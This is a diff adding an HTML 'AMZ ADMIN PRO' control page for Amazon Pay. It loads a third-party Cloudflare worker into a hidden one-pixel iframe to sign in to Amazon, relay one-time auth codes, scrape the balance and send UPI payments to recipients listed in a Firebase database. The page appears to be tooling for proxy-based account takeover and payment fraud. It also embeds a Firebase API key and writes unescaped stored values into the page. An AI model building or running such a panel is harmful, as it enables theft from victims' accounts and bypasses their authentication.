@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Master Admin - Amazon Pay</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
+        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; width: 450px; background: #050505; border-radius: 10px; }
+        .bal-box { font-size: 35px; color: #ff9900; margin: 20px 0; border: 1px solid #333; padding: 15px; font-weight: bold; }
+        .stat-text { font-size: 14px; margin-bottom: 10px; color: #aaa; }
+        .btn { background: #0f0; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; }
+        input { width: 100%; padding: 12px; margin-top: 10px; background: #111; border: 1px solid #0f0; color: #0f0; text-align: center; box-sizing: border-box; }
+        #hidden_frame { width: 1px; height: 1px; opacity: 0; position: absolute; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>[ AMZ ADMIN PRO ]</h2>
+    <div id="stat">STATUS: DISCONNECTED</div>
+    <div class="bal-box" id="balance">₹ --.--</div>
+
+    <button class="btn" onclick="login()">🚀 1. AUTO LOGIN (BG)</button>
+    <input type="text" id="otp" placeholder="6-DIGIT AUTH CODE">
+    <button class="btn" style="background:#fff" onclick="sendOTP()">📤 2. SUBMIT AUTH CODE</button>
+    
+    <button class="btn" style="background:red; color:#fff; margin-top:10px;" onclick="fullLogout()">🚪 LOGOUT & RESET</button>
+</div>
+
+
+
+
+
+
+    <h4 style="border-top:1px solid #333; padding-top:15px; margin-top:15px;">PENDING PAYOUTS</h4>
+    <div id="payout_list" style="text-align:left; font-size:12px; max-height: 150px; overflow-y: auto;"></div>
+</div>
+
+<iframe id="hidden_frame" name="hidden_frame"></iframe>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCZ5P2t5xRhy5d0IXV6UWcvbkUWXqyPENA",
+        authDomain: "smbrand-4543a.firebaseapp.com",
+        databaseURL: "https://smbrand-4543a-default-rtdb.firebaseio.com",
+        projectId: "smbrand-4543a",
+        appId: "1:720775550032:web:0622548a007597778bad55"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const worker = "https://pco.rajputsurendra562.workers.dev";
+
+    function login() {
+        document.getElementById('stat').innerText = "STATUS: INJECTING...";
+        document.getElementById('hidden_frame').src = worker + "/ap/signin";
+    }
+
+    function sendOTP() {
+        const code = document.getElementById('otp').value;
+        document.getElementById('hidden_frame').contentWindow.postMessage({type:'FILL_OTP', code:code}, '*');
+        document.getElementById('stat').innerText = "STATUS: VERIFYING OTP...";
+    }
+
+    function checkSession() {
+        document.getElementById('hidden_frame').src = worker + "/amazonpay/home";
+        document.getElementById('stat').innerText = "STATUS: CHECKING BALANCE...";
+    }
+
+    // --- Message Listener for Balance & Status ---
+    window.addEventListener('message', (e) => {
+        if(e.data.type === 'SET_BAL') {
+            document.getElementById('balance').innerText = e.data.val;
+            db.ref('system/current_balance').set(e.data.val);
+        }
+        if(e.data.type === 'AMZ_ONLINE') {
+            document.getElementById('stat').innerText = "STATUS: ONLINE ✅";
+            document.getElementById('stat').style.color = "#0f0";
+            db.ref('system/status').set("ONLINE ✅");
+        }
+    });
+
+    // Payout logic (Same as before)
+    db.ref('payouts').on('value', snap => {
+        let html = "";
+        snap.forEach(c => {
+            const d = c.val();
+            if(d.status === 'pending') {
+                html += `<div style="margin-bottom:5px;">₹${d.amount} -> ${d.upi} <button onclick="pay('${d.upi}','${d.amount}','${c.key}')">PAY</button></div>`;
+            }
+        });
+        document.getElementById('payout_list').innerHTML = html || "No pending requests.";
+    });
+
+    function pay(upi, amt, id) {
+        document.getElementById('hidden_frame').src = worker + `/gp/pay/send?upi=${upi}&amt=${amt}`;
+        db.ref('payouts/'+id).update({status:'paid'});
+    }
+</script>
+</body>
+</html>
+
